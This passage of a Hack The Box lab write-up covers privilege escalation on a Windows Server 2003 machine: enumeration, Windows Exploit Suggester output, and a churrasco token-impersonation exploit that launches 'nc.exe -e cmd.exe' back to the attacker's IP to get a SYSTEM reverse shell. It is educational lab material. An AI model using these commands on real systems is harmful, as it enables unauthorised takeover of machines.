               7 Dir(s)  18,093,420,544 bytes free

```

And I can write here:

```

C:\wmpub>echo test > test.txt

C:\wmpub>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub

05/28/2020  02:46 PM    <DIR>          .
05/28/2020  02:46 PM    <DIR>          ..
05/28/2020  02:46 PM                 7 test.txt
04/12/2017  05:05 PM    <DIR>          wmiislog
               1 File(s)              7 bytes
               3 Dir(s)  18,094,600,192 bytes free

C:\wmpub>type test.txt
test 

```

`icacles` shows that as well:

```

C:\>icacls wmpub
wmpub BUILTIN\Administrators:(F)
      BUILTIN\Administrators:(I)(OI)(CI)(F)
      NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
      CREATOR OWNER:(I)(OI)(CI)(IO)(F)
      BUILTIN\Users:(I)(OI)(CI)(RX)
      BUILTIN\Users:(I)(CI)(AD)
      BUILTIN\Users:(I)(CI)(WD)

Successfully processed 1 files; Failed processing 0 files

```

That Userss can `WD` [decodes to](https://superuser.com/questions/322423/explain-the-output-of-icacls-exe-line-by-line-item-by-item) write data/add files.

#### systeminfo

While you don’t see it in newer HTB, for these original hosts, kernel exploits were often the intended path, and it’s definitely something that will come up in OSCP.

To check, I’ll start with a `systeminfo`:

```

C:\wmpub>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 0 Hours, 15 Minutes, 49 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 787 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,315 MB
Page File: In Use:         155 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A

```

I can then drop that into a file and use [Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) to see what exploits might work.

First, update:

```

root@kali# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --update      
[*] initiating winsploit version 3.3...                                                                              
[+] writing to file 2020-05-28-mssb.xls
[*] done

```

Now pass it the new database and the `systeminfo` output:

```

root@kali# /opt/Windows-Exploit-Suggester/windows-exploit-suggester.py --database 2020-05-28-mssb.xls --systeminfo systeminfo                                                                             
[*] initiating winsploit version 3.3...
[*] database file detected as xls or xlsx based on extension
[*] attempting to read from the systeminfo input file
[+] systeminfo input file read successfully (ascii)
[*] querying database file for potential vulnerabilities
[*] comparing the 1 hotfix(es) against the 356 potential bulletins(s) with a database of 137 known exploits
[*] there are now 356 remaining vulns
[+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin                 
[+] windows version identified as 'Windows 2003 SP2 32-bit'                        
[*]
[M] MS15-051: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (3057191) - Important 
[*]   https://github.com/hfiref0x/CVE-2015-1701, Win32k Elevation of Privilege Vulnerability, PoC
[*]   https://www.exploit-db.com/exploits/37367/ -- Windows ClientCopyImage Win32k Exploit, MSF
[*]
[E] MS15-010: Vulnerabilities in Windows Kernel-Mode Driver Could Allow Remote Code Execution (3036220) - Critical
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows 8.1 - win32k Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/37098/ -- Microsoft Windows - Local Privilege Escalation (MS15-010), PoC
[*]   https://www.exploit-db.com/exploits/39035/ -- Microsoft Windows win32k Local Privilege Escalation (MS15-010), PoC
[*]
[E] MS14-070: Vulnerability in TCP/IP Could Allow Elevation of Privilege (2989935) - Important         
[*]   http://www.exploit-db.com/exploits/35936/ -- Microsoft Windows Server 2003 SP2 - Privilege Escalation, PoC
[*]
[E] MS14-068: Vulnerability in Kerberos Could Allow Elevation of Privilege (3011780) - Critical                   
[*]   http://www.exploit-db.com/exploits/35474/ -- Windows Kerberos - Elevation of Privilege (MS14-068), PoC
[*]
[M] MS14-064: Vulnerabilities in Windows OLE Could Allow Remote Code Execution (3011443) - Critical       
[*]   https://www.exploit-db.com/exploits/37800// -- Microsoft Windows HTA (HTML Application) - Remote Code Execution (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35308/ -- Internet Explorer OLE Pre-IE11 - Automation Array Remote Code Execution / Powershell VirtualAlloc (MS14-064), PoC
[*]   http://www.exploit-db.com/exploits/35229/ -- Internet Explorer <= 11 - OLE Automation Array Remote Code Execution (#1), PoC
[*]   http://www.exploit-db.com/exploits/35230/ -- Internet Explorer < 11 - OLE Automation Array Remote Code Execution (MSF), MSF
[*]   http://www.exploit-db.com/exploits/35235/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution Through Python, MSF
[*]   http://www.exploit-db.com/exploits/35236/ -- MS14-064 Microsoft Windows OLE Package Manager Code Execution, MSF 
[*]
[M] MS14-062: Vulnerability in Message Queuing Service Could Allow Elevation of Privilege (2993254) - Important
[*]   http://www.exploit-db.com/exploits/34112/ -- Microsoft Windows XP SP3 MQAC.sys - Arbitrary Write Privilege Escalation, PoC
[*]   http://www.exploit-db.com/exploits/34982/ -- Microsoft Bluetooth Personal Area Networking (BthPan.sys) Privilege Escalation
[*]
[M] MS14-058: Vulnerabilities in Kernel-Mode Driver Could Allow Remote Code Execution (3000061) - Critical
[*]   http://www.exploit-db.com/exploits/35101/ -- Windows TrackPopupMenu Win32k NULL Pointer Dereference, MSF
[*] 
[E] MS14-040: Vulnerability in Ancillary Function Driver (AFD) Could Allow Elevation of Privilege (2975684) - Important
[*]   https://www.exploit-db.com/exploits/39525/ -- Microsoft Windows 7 x64 - afd.sys Privilege Escalation (MS14-040), PoC
[*]   https://www.exploit-db.com/exploits/39446/ -- Microsoft Windows - afd.sys Dangling Pointer Privilege Escalation (MS14-040), PoC
[*] 
[E] MS14-035: Cumulative Security Update for Internet Explorer (2969262) - Critical
[E] MS14-029: Security Update for Internet Explorer (2962482) - Critical
[*]   http://www.exploit-db.com/exploits/34458/
[*] 
[E] MS14-026: Vulnerability in .NET Framework Could Allow Elevation of Privilege (2958732) - Important
[*]   http://www.exploit-db.com/exploits/35280/, -- .NET Remoting Services Remote Command Execution, PoC
[*] 
[M] MS14-012: Cumulative Security Update for Internet Explorer (2925418) - Critical
[M] MS14-009: Vulnerabilities in .NET Framework Could Allow Elevation of Privilege (2916607) - Important
[E] MS14-002: Vulnerability in Windows Kernel Could Allow Elevation of Privilege (2914368) - Important
[E] MS13-101: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (2880430) - Important 
[M] MS13-097: Cumulative Security Update for Internet Explorer (2898785) - Critical
[M] MS13-090: Cumulative Security Update of ActiveX Kill Bits (2900986) - Critical
[M] MS13-080: Cumulative Security Update for Internet Explorer (2879017) - Critical
[M] MS13-071: Vulnerability in Windows Theme File Could Allow Remote Code Execution (2864063) - Important
[M] MS13-069: Cumulative Security Update for Internet Explorer (2870699) - Critical
[M] MS13-059: Cumulative Security Update for Internet Explorer (2862772) - Critical
[M] MS13-055: Cumulative Security Update for Internet Explorer (2846071) - Critical
[M] MS13-053: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (2850851) - Critical
[M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
[E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
[*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
[*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
[*] 
[M] MS11-080: Vulnerability in Ancillary Function Driver Could Allow Elevation of Privilege (2592799) - Important
[E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
[M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
[M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
[M] MS10-015: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (977165) - Important
[M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
[M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
[M] MS09-065: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Remote Code Execution (969947) - Critical
[M] MS09-053: Vulnerabilities in FTP Service for Internet Information Services Could Allow Remote Code Execution (975254) - Important
[M] MS09-020: Vulnerabilities in Internet Information Services (IIS) Could Allow Elevation of Privilege (970483) - Important
[M] MS09-004: Vulnerability in Microsoft SQL Server Could Allow Remote Code Execution (959420) - Important
[M] MS09-002: Cumulative Security Update for Internet Explorer (961260) (961260) - Critical
[M] MS09-001: Vulnerabilities in SMB Could Allow Remote Code Execution (958687) - Critical
[M] MS08-078: Security Update for Internet Explorer (960714) - Critical
[*] done

```

### Exploit - Failure

#### Strategy, Trial and Error

Going from this list to a shell is often a lot of googling, guessing, and trial and error. I’ll reduce the list with the following criteria:
- Not interested in Metasploit.
- Looking (at least to start) for exploits against Windows itself, not IE or MsSQL.
- I like to start with ones that I can find a pre-compiled exe. That’s not a great idea for real work, but easiest for HTB / OSCP.
- The exe has to create a new process that calls back or can return a shell in the same window. You’ll find a lot of these have exes that open a new shell as SYSTEM, which isn’t useful at all for me.

#### No Success

I tried a lot off this list, but none with success. This is normal for this kind of thing. It’s frustrating, and normal. One tip I’d throw out for anyone doing OSCP - keep a list of exploits that have binaries that fit the descriptions above and where they work. I used to have one, but can’t find it anymore. Something like [this](https://mysecurityjournal.blogspot.com/p/client-side-attacks.html) is a really good start.

### Enumeration Again

I went back to enumerating, and checked privs:

```

C:\>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 

```

`SEImpersonalPrivilege` is one I know to look out for. For modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, it’s better to start with churrasco.

### churrasco

I grabbed the binary from the [Churrasco GitHub](https://github.com/Re4son/Churrasco/). I ran `smbserver.py share .` on my local machine to open an SMB share named share with both `nc.exe` and `churrasco.exe` in that directory:

```

C:\wmpub>copy \\10.10.14.47\share\nc.exe .
        1 file(s) copied.

C:\wmpub>copy \\10.10.14.47\share\churrasco.exe c.exe
        1 file(s) copied.

C:\wmpub>dir
 Volume in drive C has no label.
 Volume Serial Number is 246C-D7FE

 Directory of C:\wmpub

05/28/2020  02:50 PM    <DIR>          .
05/28/2020  02:50 PM    <DIR>          ..
05/28/2020  02:38 PM            31,232 c.exe
05/28/2020  04:35 AM            38,616 nc.exe
05/28/2020  02:46 PM                 7 test.txt
04/12/2017  05:05 PM    <DIR>          wmiislog
               3 File(s)         69,855 bytes
               3 Dir(s)  18,092,220,416 bytes free

```

Now run it, having it run `nc` to connect back to me:

```

C:\wmpub>.\c.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.14.47 443"
/churrasco/-->Current User: NETWORK SERVICE 
/churrasco/-->Getting Rpcss PID ...
/churrasco/-->Found Rpcss PID: 684 
/churrasco/-->Searching for Rpcss threads ...
/churrasco/-->Found Thread: 688 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 692 
/churrasco/-->Thread not impersonating, looking for another thread...
/churrasco/-->Found Thread: 700 
/churrasco/-->Thread impersonating, got NETWORK SERVICE Token: 0x72c
/churrasco/-->Getting SYSTEM token from Rpcss Service...
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found NETWORK SERVICE Token
/churrasco/-->Found LOCAL SERVICE Token
/churrasco/-->Found SYSTEM token 0x724
/churrasco/-->Running command with SYSTEM Token...
/churrasco/-->Done, command should have ran as SYSTEM!

```

And on my listener:

```

root@kali# rlwrap nc -lnvp 443
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::443
Ncat: Listening on 0.0.0.0:443
Ncat: Connection from 10.10.10.14.
Ncat: Connection from 10.10.10.14:1038.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system

```

### Flags

From there I can grab both flags:

```

C:\Documents and Settings>type harry\desktop\user.txt
bdff5ec6************************
C:\Documents and Settings>type administrator\desktop\root.txt
9359e905************************

```